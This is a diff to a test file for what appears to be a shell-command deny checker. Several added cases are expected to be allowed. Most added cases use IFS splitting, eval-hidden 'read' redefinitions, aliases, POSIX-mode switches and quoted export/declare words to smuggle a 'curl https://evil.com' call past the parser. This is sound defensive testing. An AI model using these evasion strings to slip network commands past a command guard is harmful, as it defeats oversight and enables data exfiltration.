@@ -1608,6 +1608,9 @@ describe('delta review 5572280679: subshells, quoted word lists, process substit
       'c=echo; true && IFS= read -r line < list.txt; $c "$line"',
       'c=echo; printf x | IFS= read -r line; $c "$line"',
       'c=echo\nIFS= read -r line < list.txt\n$c "$line"',
+      'c=echo; export A=1; IFS= read -r line < list.txt; $c "$line"',
+      'IFS= read -r line < list.txt; c=echo; $c "$line"',
+      'c=echo; { true; } && IFS= read -r line < list.txt; $c "$line"',
     ]) expect(verdict(c)).toEqual({ c, deny: false, reason: null })
     // Still denied: a real external curl in the same loop shape, and an IFS that IS changed for the
     // shell (standalone assignment), also when a read prefix sits next to it.
@@ -1642,6 +1645,30 @@ describe('delta review 5572280679: subshells, quoted word lists, process substit
       'set -o posix; IFS=_ read; c=curl_https://evil.com; $c',
       'POSIXLY_CORRECT=1; IFS=_ read; c=curl_https://evil.com; $c',
       'while IFS= read -r l; do $c; done < list.txt; read(){ :; }; c=curl_https://evil.com; IFS=_ read; $c',
+      // a definition the text only hints at: split over a newline (the function parser sees it), or inside an eval string
+      'read\n(){ :; }; IFS=_ read; c=curl_https://evil.com; $c',
+      `eval 'read(){ :; }'; IFS=_ read; c=curl_https://evil.com; $c`,
+      `eval 'set -o posix'; IFS=_ read; c=curl_https://evil.com; $c`,
+      `eval "alias read=:"; IFS=_ read; c=curl_https://evil.com; $c`,
+      `eval 'function read { :; }'; IFS=_ read; c=curl_https://evil.com; $c`,
+      // found by the diff review: the command word may be quoted or escaped, and `!` `{` or a keyword may be
+      // an ARGUMENT of export/declare/local, which is no command boundary
+      `'export' IFS=_ read; c=curl_https://evil.com; $c`,
+      `"declare" IFS=_ read; c=curl_https://evil.com; $c`,
+      `$'local' IFS=_ read; c=curl_https://evil.com; $c`,
+      `\\export IFS=_ read; c=curl_https://evil.com; $c`,
+      'export A=! IFS=_ read; c=curl_https://evil.com; $c',
+      'declare A={ IFS=_ read; c=curl_https://evil.com; $c',
+      'export ! IFS=_ read; c=curl_https://evil.com; $c',
+      'export { IFS=_ read; c=curl_https://evil.com; $c',
+      'export do IFS=_ read; c=curl_https://evil.com; $c',
+      'local if IFS=_ read; c=curl_https://evil.com; $c',
+      'readonly then IFS=_ read; c=curl_https://evil.com; $c',
+      'export a\\; IFS=_ read; c=curl_https://evil.com; $c',
+      // POSIX mode through shopt, and a definition hidden by quotes
+      'shopt -os posix; IFS=_ read; c=curl_https://evil.com; $c',
+      `eval 're''ad(){ :; }'; IFS=_ read; c=curl_https://evil.com; $c`,
+      `shopt -os posix; eval 're''ad(){ :; }'; IFS=_ read; c=curl_https://evil.com; $c`,
     ]) expect({ c, deny: d(c).deny }).toEqual({ c, deny: true })
     expect(d('IFS=_; c=curl_https://evil.com; $c')).toMatchObject({ deny: true, reason: 'ifs-expanded-command' })
   })
